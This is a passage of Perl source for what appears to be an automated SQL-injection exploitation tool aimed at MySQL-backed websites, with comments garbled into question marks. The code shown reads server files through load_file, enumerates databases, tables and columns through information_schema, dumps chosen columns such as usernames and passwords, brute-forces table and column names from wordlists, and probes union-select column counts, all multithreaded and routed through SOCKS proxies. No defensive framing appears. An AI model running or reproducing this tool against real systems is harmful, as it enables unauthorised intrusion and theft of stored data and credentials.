$choice1 = ascii_to_hex $choice;
if($sql_flag == 0){
$current = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6d7973716c2e757365723a,load_file($choice1 ))" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6d7973716c2e757365723a,load_file($choice1 ))" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x6d7973716c2e757365723a,load_file($choice1 ))" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr; 
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/imgs) {
print "\n\n\n" . $1 . "\n";
print FILE $1 . "\n";
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto M_LOAD_FILE;
}
if ($choice == 4) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the DB-name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "DB-name: $choice\n";
print "----------\n";
$choice1 = ascii_to_hex $choice;
print "-----------------------------------------\n";
print "Enter the TABLE-name: ";
$choice2 = <STDIN>;
chomp $choice2;
if ($choice2 =~ m/-/imgs) {$choice2 = "`" . $choice2 . "`"}
print "TABLE-name: $choice2\n";
print "----------\n";
$choice3 = ascii_to_hex $choice2;
$url11 = $sql_start . $sql_pref1 . "count(column_name)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice3 . $plus . "and" . $plus . "table_schema=" . $plus . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url11;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url11;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url11;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$col_num1 = $content;
$col_num1 =~ m/ussr(.*?)ussr/img;
$col_num1 = $1;
print FILE "-----------------------------------------\n";
print FILE "Columns in [$choice.$choice2]: $col_num1\n";
print FILE "-----------------------------------------\n";
print "-----------------------------------------\n";
print "Columns in [$choice.$choice2]: $col_num1\n";
print "-----------------------------------------\n";
$url12 = $sql_start . $sql_CP_start . $sql_pref1 . "column_name" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice3 . $plus . "and" . $plus . "table_schema=" . $plus . $choice1;
$num = -1; # ?? ????????
$thr = $kol_threads; # ???-?? ???????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets5052);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5052 {
$| = 1;
while ($num<$col_num1) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
################################################## ###############################
if ($choice == 5) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
## ???-?? ?????? ? information_schema.tables ##
$url11 = $sql_start . $sql_pref1 . "count(table_name)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . "information_schema.tables" . $limit . $filtr; # ??????? ???-?? ??????
if($sql_flag == 0){
$current = $url11;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url11;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url11;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$tab_num = $content;
$tab_num =~ m/ussr(.*?)ussr/imgs;
$tab_num = $1; # ???-?? ???????? ? informaion_schema
print "-----------------------------------------\n";
print "Tables in information_schema.tables - $1\n";
print "-----------------------------------------\n";
## start from2 ##
print "Get ALL tables from information_schema ($1) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$tab_num = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($tab_num+1) . "]\n";
}
print "-----------------------------------------\n";
## end from2
print FILE "-----------------------------------------\n";
print FILE "Tables in information_schema.tables - $1\n";
print FILE "-----------------------------------------\n";
$url12 = $sql_start . $sql_CP_start . $sql_pref1 . "table_name" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.tables";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets {
$| = 1;
while ($num<$tab_num) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url12 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print $1 . "\n";
print FILE $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
if ($choice == 6) {
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
print "Table: $choice\n";
print "----------\n";
print FILE "-----------------------------------------\n";
print FILE "Table [ $choice ]\n";
print FILE "-----------------------------------------\n";
$choice1 = ascii_to_hex $choice;
$url13 = $sql_start . $sql_CP_start . $sql_pref1 . "table_schema" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.tables" . $plus . "where" . $plus . "table_name=" . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url13;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url13;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url13;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
print "Database for $choice: $prefix\n";
print FILE "Database for $choice: $prefix\n";
$url14 = $sql_start . $sql_pref1 . "count(*)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url14;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url14;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url14;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$colum_number = $content;
$colum_number =~ m/ussr(.*?)ussr/img;
$colum_number = $1; # ???-?? ??????? ? ??????????? ?????
$full_table_name = $prefix . "." . $choice;
print "Number of columns in " . $full_table_name . ": $colum_number\n";
print FILE "Number of columns in " . $full_table_name . ": $colum_number\n";
print "----------\n";
## ?????? ??????? ##
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$url15 = $sql_start . $sql_CP_start . $sql_pref1 . "column_name" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice1;
print FILE "Columns in " . $full_table_name . "\n";
for(0..$thr) {
$trl[$_] = threads->create(\&gets2);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets2 {
$| = 1;
while ($num<$colum_number) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url15 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url15 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url15 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print FILE "----------\n";
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
if ($choice == 7) {
sub ascii_to_hex ($) {
(my $str = shift) =~ s/(.|\n)/sprintf("%02lx", ord $1)/eg;
$str = "0x" . $str;
return $str;
}
open( FILE, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
if ($full_table_name) {
print "-----------------------------------------\n";
print "Use last parsed table: $full_table_name ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
$table_name = $full_table_name;
print "Table: $table_name\n";
print "----------\n";
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $choice;
if ($table_name =~ m/-/imgs) {$table_name = "`" . $table_name . "`"}
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
$url13 = $sql_start . $sql_CP_start . $sql_pref1 . "table_schema" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url13;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url13;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url13;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = "`" . $prefix . "." . $table_name . "`";
}
print "Table: $table_name\n";
print "----------\n";
}
} else {
print "-----------------------------------------\n";
print "Enter the table_name: ";
$choice = <STDIN>;
chomp $choice;
$table_name = $choice;
if ($table_name =~ m/-/imgs) {$table_name = "`" . $table_name . "`"}
print "-----------------------------------------\n";
print "MySQL>=5 or MySql<5? [if DBname.TableName - 0] (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
$choice1 = ascii_to_hex $table_name;
$url13 = $sql_start . $sql_CP_start . $sql_pref1 . "table_schema" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . "information_schema.columns" . $plus . "where" . $plus . "table_name=" . $choice1 . $limit . $filtr;
if($sql_flag == 0){
$current = $url13;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url13;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url13;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$prefix = $content;
$prefix =~ m/ussr(.*?)ussr/img;
$prefix = $1; # ??, ? ??????? ???????
if ($prefix =~ m/-/imgs) {$prefix = "`" . $prefix . "`"}
$table_name = $prefix . "." . $table_name;
}
print "Table: $table_name\n";
print "----------\n";
}
print "-----------------------------------------\n";
print "Enter the column(s) name(s) - for example - id or id,username,user_password:\n";
$choice = <STDIN>;
chomp $choice;
$column_name = $choice;
print FILE "-----------------------------------------\n";
print FILE "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print FILE "-----------------------------------------\n";
print "Dump column(s): [ " . $column_name . " ] from [ " .$table_name . " ]\n";
print "-----------------------------------------\n";
print "Do you want add condition to sql-query?\n";
print "----------\n";
print "for example - where id=1, where username=admin (no quotes) ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice==1) {
print "-----------------------------------------\n";
print "Enter your condition here - only one condition, without 'where', '+' and quotes, example - id=1 :\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;

$where = $choice;
# ?????????:
($con,$whe) = split(/=/,$where);
if($whe =~ m/[^0-9]/img) {$where = $con . "=" . ascii_to_hex $whe}
print "Your condition: [ where $where ]\n";
$condition=1;
} else {
$condition=0;
}
if ($condition==0) {
print "----------\n";
## ?????? ???-?? ???????? ?? ??????? #
print "Count data from [ $table_name ]\n";
$url16 = $sql_start . $sql_pref1 . "count(*)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . $table_name . $limit . $filtr;
if($sql_flag == 0){
$current = $url16;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url16;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url16;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
## ?????? ?????? ?? ??????? ##
$url17 = $sql_start . $sql_CP_start . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $sql_CP_end . $sql_end . $plus ."from" . $plus . $table_name;
for(0..$thr) {
$trl[$_] = threads->create(\&gets4);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets4 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url17 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url17 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url17 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
} else {
## ?????? ?????? ?? ??????? ##
print "Count data from [ $table_name ] with [ where " . $where . " ] \n";
$url16 = $sql_start . $sql_pref1 . "count(*)" . $sql_pref2 . $sql_end . $plus . "from" . $plus . $table_name . $plus . "where" . $plus . $where . $limit . $filtr;
if($sql_flag == 0){
$current = $url16;
$content = scan_url();
} elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url16;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url16;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
$column_name_p = $content;
$column_name_p =~ m/ussr(.*?)ussr/img;
$column_name_p = $1; # ???-?? ???????? ? ??????? ?? ????????? ???????
print "$column_name_p\n";
print "----------\n";
## start from2 ##
print "Get ALL data from " . $table_name . " with [ where " . $where . " ] (" . $column_name_p . ") ? (1/0): ";
$choice = <STDIN>;
chomp $choice;
$thr = $kol_threads; # ???-?? ???????
if ($choice == 1) {
$num = -1; # ?? ????????
} else {
print "Enter START_position: ";
$choice1 = <STDIN>;
chomp $choice1;
$num = $choice1-2;
print "Enter END_position: ";
$choice2 = <STDIN>;
chomp $choice2;
$column_name_p = $choice2-1;
print "Dump records from [" . ($num+2) . "] to [" . ($column_name_p+1) . "]\n";
}
print "-----------------------------------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
## end from2
$url18 = $sql_start . $sql_CP_start . $sql_pref1 . "concat_ws(0x3a," . $column_name . ")" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . $table_name . $plus . "where" . $plus . $where;
for(0..$thr) {
$trl[$_] = threads->create(\&gets5);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets5 {
$| = 1;
while ($num<$column_name_p) {
{ lock($num);
$num++; }
if($sql_flag == 0){
$current = $url18 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url();
}elsif ($sql_flag == 1) {#POST
$current = $source_sql;
$sql_post = $url18 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$content = scan_url_POST();
} elsif($sql_flag == 2){#HEADER
$current = $source_sql;
$sql_header_query = $url18 . $plus . "limit" . $plus . $num . ",1" . $filtr;
$sql_header_query =~ s!\Q$search!$replacement!g;
$content = scan_url_HEADER();
} 
if ($content =~ m/ussr(.*?)ussr/img) {
print " " . $1 . "\n";
print FILE " " . $1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE);
goto START;
}
}
if ($choice == 8) {
START1:

print " [1] Brute table\n";
print " [2] Brute column\n";
print " [3] Main menu\n";
print "----------\n";
$choice = <STDIN>;
chomp $choice;
print "Your choice: $choice\n";
$url19 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x7665723a,version())" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
print "Check version(): ";
$current = $url19;
$content = scan_url();
$ver = $content;
$ver =~ m/ussr(.*?)ussr/img;
$ver = $1;
if ($ver) {
print " $ver \n";
} else {
print " Can't get data \n";
goto START1;
}
print "-------------\n";
if ($choice == 1) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute tables\n";
print " -------------\n";
print FILE1 " Brute tables\n";
print FILE1 " -------------\n";
open(FILE, "<", $source_table_list);
while(<FILE>) {
chomp;
push(@tables4, $_);
}
close(FILE);
print "Add prefix for brute tables ? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute tables: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @tables4;
print "File: $source_table_list\n";
print "Tables: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets6);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets6 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $tables4[$num];
$url25 = $sql_start . $sql_CP_start . $sql_pref1 . "concat_ws(0x3a," . $num . ")" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . $current1 . $limit . $filtr;
$current = $url25;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START1;
}
if ($choice == 2) {
open( FILE1, ">>" . "z_" .$host . ".txt" ); # ???? ??? ?????? ???????????
print " Brute columns\n";
print " -------------\n";
print FILE1 " Brute columns\n";
print FILE1 " -------------\n";
print "Enter the table_name for brute: \n";
$choice = <STDIN>;
chomp $choice;
if ($choice =~ m/-/imgs) {$choice = "`" . $choice . "`"}
$table = $choice;
print "Brute columns for table [ " . $table . " ]\n";
print "-------------\n";
print " Check table exist: ";
$url20 = $sql_start . $sql_CP_start . $sql_pref1 . "concat(0x7665723a,$table)" . $sql_pref2 . $sql_CP_end . $sql_end . $limit . $filtr;
$current = $url20;
$content = scan_url();
$ver =$content;
$ver =~ m/ussr(.*?)ussr/img;
$ver = $1;
if ($ver) {
print " Ok \n";
} else {
print " No such table... \n";
goto START1;
}
open(FILE, "<", $source_column_list);
while(<FILE>) {
chomp;
push(@columns4, $_);
}
close(FILE);
print "Add prefix for brute columns? ( for example - PHPBB_ ) (1/0): ";
$choice = <STDIN>;
chomp $choice;
if ($choice == 1) {
print "Enter your prefix for brute columns: ";
$choice = <STDIN>;
chomp $choice;
$pref_brute = $choice;
} else {
$pref_brute = "";
}
$size = 0;
$size = @columns4;
print "-------------\n";
print "File: $source_column_list\n";
print "Columns: $size\n";
print "-------------\n";
print "Request method - $method\n";
print "Threads - $kol_threads\n";
print "Proxy - $proxy_message\n";
print "----------------------\n";
$thr = $kol_threads; # ???-?? ???????
$num = -1; # ?? ????????
for(0..$thr) {
$trl[$_] = threads->create(\&gets7);
}
for(0..$thr) {
$trl[$_]->join;
}
sub gets7 {
$| = 1;
while ($num<$size) {
{ lock($num);
$num++; }
$current1 = $pref_brute . $columns4[$num];
$url26 = $sql_start . $sql_CP_start . $sql_pref1 . "concat_ws(0x3a," . $current1 . ")" . $sql_pref2 . $sql_CP_end . $sql_end . $plus . "from" . $plus . $table . $limit . $filtr;
$current = $url26;
$content = scan_url();
if ($content =~ m/ussr(.*?)ussr/img) {
print " ---> " . $current1 . "\n";
print FILE1 " " . $current1 . "\n";
}
print $num . "\r";
sleep $pause;

}
}
print "----------\n";
print "Saved in " . "z_" . $host . ".txt\n";
close(FILE1);
goto START1;
}
if ($choice == 3) {
goto START_global;
}
}
if ($choice == 9) {
if ($source_sql_c =~ m/^https:\/\/?([^\/]+)/i) {
$host5 = $1;
$https_flag = 1;
print "----------------------\n";
print "HTTPS mode enabled\n";
print "----------------------\n";
}
$host = $host5;
if ($https_mode_auth == 1 && $https_auth_check == 0 && $https_flag == 1) {
print "-----------------------------------------\n";
print "Authorization required, wait please....";
my $answ1 = req($host, $https_auth_script_path, 'POST', $https_auth_post_data, 0);
$ck1 = collect($answ1);
$https_auth_check = 1;
print " DONE\n";
print "-----------------------------------------\n";
}
if ($use_socks == 1 && $socks_check == 0) {
$check_url = $host;
our $query = "GET / HTTP/1.$http_protocol\r\n"
. "Host: $check_host\r\n"
. "Referer: http://" . $check_url . "\r\n"
. "Accept: */*\r\n"
. "User-Agent: Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090716 Ubuntu/9.04 (jaunty) Shiretoko/3.5.1\r\n"
. "Connection: close\r\n\r\n";
print "----------------------------------------\n";
print "You choose mode with SOCKS, try to find good in $socks_file ...\n";
print "Timeout = 5 sec:\n";
print "----------------------------------------\n";
$socks_check = 0;
$check_socks = socks_check();
($current_proxy_host,$current_proxy_port,$socks_ty pe) = split(/:/,$check_socks);
$proxy_message = "$current_proxy_host:$current_proxy_port, SOCKS" . $socks_type;
if ($current_proxy_host) {
$socks_check = 1;
print "Will use --> $proxy_message\n";
} else {
$socks_check = 0;
$proxy_message = "No";
print "No good SOCKS in " . $socks_file . ", change mode. Exit...\n";
}
}
open( FILE1, ">>" . "z_" . $host5. ".txt"); # ???? ??? ?????? ???????????
if ($sql_mess_type == 0) {
$mess_type = "When wrong";
} else {
$mess_type = "When right";

}
## ?????????? ?????? ???????? ??????? ??? ?????? ##
print "Threads - $kol_threads\n";
print "Method - $method\n";
print "Mysql inj URL - ". $source_sql_c . $plus_c . "union" . $plus_c . "select...." . $filtr_c . "\n";
print "Message - [" . $sql_mess . "]\n";
print "Message type - [" . $mess_type . "]\n";
print "--------------------------------------\n";
print "Check first 20 columns - no limit\n";
print "--------------------------------------\n";

$current_column_start = 1;
$current_column_number = 20;
$current_column_limit = "";
%aa = ();
$c_number = 0;
$good_url = "";
$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ###########
## ?????????? ?????? ???????? ??????? limit+0,1 ##
print "--------------------------------------\n";
print "Check first 20 columns - limit" . $plus_c . "0,1\n";
print "--------------------------------------\n";

$current_column_start = 1;
$current_column_number = 20;
$current_column_limit = "0,1";
%aa = ();
$c_number = 0;
$good_url = "";
$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ###########
## ?????????? ?????? ???????? ??????? limit+1,1 ##
print "--------------------------------------\n";
print "Check first 20 columns - limit" . $plus_c . "1,1\n";
print "--------------------------------------\n";

$current_column_start = 1;
$current_column_number = 20;
$current_column_limit = "1,1";
%aa = ();
$c_number = 0;
$good_url = "";
$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ###############
## ?????????? ??????? ? 21 ?? sql_max_column_number ??? ?????? ##
print "--------------------------------------\n";
print "Check columns from 21 to $sql_max_column_number - no limit\n";
print "--------------------------------------\n";

$current_column_start = 21;
$current_column_number = $sql_max_column_number;
$current_column_limit = "";
%aa = ();
$c_number = 0;
$good_url = "";
$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ##############
## ?????????? ??????? ? 21 ?? sql_max_column_number limit+0,1 ##
print "--------------------------------------\n";
print "Check columns from 21 to $sql_max_column_number - limit" . $plus_c . "0,1\n";
print "--------------------------------------\n";

$current_column_start = 21;
$current_column_number = $sql_max_column_number;
$current_column_limit = "0,1";
%aa = ();
$c_number = 0;
$good_url = "";
$aa = gets5000();
$data1 = "";
$data1 = $aa->{$_},for sort {$a <=> $b} keys %$aa;
($good_url,$c_number) = split(/\|\|/,$data1);
if ($good_url) {
print "---------------------------\n";
print "Column number = " . $c_number . "\n";
print "URL - " . $good_url . "\n";
print FILE1 "------------------\n";
print FILE1 "Number of columns:" . $c_number . "\n";
print FILE1 "------------------\n";
print FILE1 $good_url . "\n";
goto PRINTABLE_COLUMN;
}
################################################## ##############
## ?????????? ??????? ? 21 ?? sql_max_column_number limit+1,1 ##
print "--------------------------------------\n";
print "Check columns from 21 to $sql_max_column_number - limit" . $plus_c . "1,1\n";
print "--------------------------------------\n";

$current_column_start = 21;
$current_column_number = $sql_max_column_number;
$current_column_limit = "1,1";
%aa = ();
$c_number = 0;
$good_url = "";
